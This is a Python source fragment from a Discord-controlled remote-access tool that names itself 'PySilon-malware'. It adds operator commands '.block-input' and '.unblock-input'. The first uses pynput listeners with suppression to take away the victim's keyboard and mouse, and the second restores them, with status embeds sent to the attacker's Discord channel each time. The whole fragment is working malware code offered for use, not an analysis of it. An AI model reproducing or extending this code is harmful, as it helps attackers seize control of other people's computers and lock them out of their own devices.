from pynput import keyboard, mouse
# end of imports
# on message
elif message.content == '.block-input':
    #.log Message is "block input" 
    if not input_blocked:
        #.log Input is not already blocked 
        await message.delete()
        #.log Removed the message 
        async def on_press():
            pass
        async def on_release():
            pass
        async def on_click():
            pass
        keyboard_listener = keyboard.Listener(suppress=True)
        #.log Created keyboard listener 
        mouse_listener = mouse.Listener(suppress=True)
        #.log Created mouse listener 
        keyboard_listener.start()
        #.log Disabled keyboard 
        mouse_listener.start()
        #.log Disabled mouse 
        embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about blocked input 
        input_blocked = True
    else:
        #.log Input is already blocked 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about already blocked input 
elif message.content == '.unblock-input':
    #.log Message is "unblock input" 
    if input_blocked:
        #.log Input is blocked 
        await message.delete()
        #.log Removed the message 
        keyboard_listener.stop()
        #.log Unblocked keyboard 
        mouse_listener.stop()
        #.log Unblocked mouse 
        embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about unblocked input 
        input_blocked = False
    else:
        #.log Input is not blocked 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about unblocked input 
